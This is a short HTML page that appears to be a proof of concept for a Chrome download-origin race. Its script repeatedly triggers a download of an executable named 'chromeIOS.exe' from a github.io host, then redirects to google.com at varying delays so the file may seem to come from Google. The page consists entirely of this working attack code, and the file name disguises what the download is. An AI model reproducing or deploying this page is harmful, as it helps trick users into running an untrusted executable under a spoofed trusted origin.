<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Download Race Condition Test</title>

<style>
button{
background:#4CAF50;
color:white;
border:none;
padding:15px 30px;
font-size:16px;
cursor:pointer;
}

#log{
font-family:monospace;
margin-top:20px;
}
</style>

</head>
<body>

<center>
<h2>Chrome Download Origin Race Test</h2>
<button onclick="start()">Start Test</button>

<div id="log"></div>
</center>

<script>

const file="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";

function start(){

log("Starting race test...");

let delays=[10,30,60,120,200,300];

delays.forEach((delay,i)=>{

setTimeout(()=>{

log("Attempt delay: "+delay+"ms");

triggerDownload();

setTimeout(()=>{
window.location.replace("https://google.com");
},delay);

},i*1200);

});

}

function triggerDownload(){

let a=document.createElement("a");
a.href=file;
a.download="chromeIOS.exe";

document.body.appendChild(a);
a.click();
document.body.removeChild(a);

}

function log(msg){

let d=document.createElement("div");
d.textContent=msg;
document.getElementById("log").appendChild(d);

}

</script>

</body>
</html>
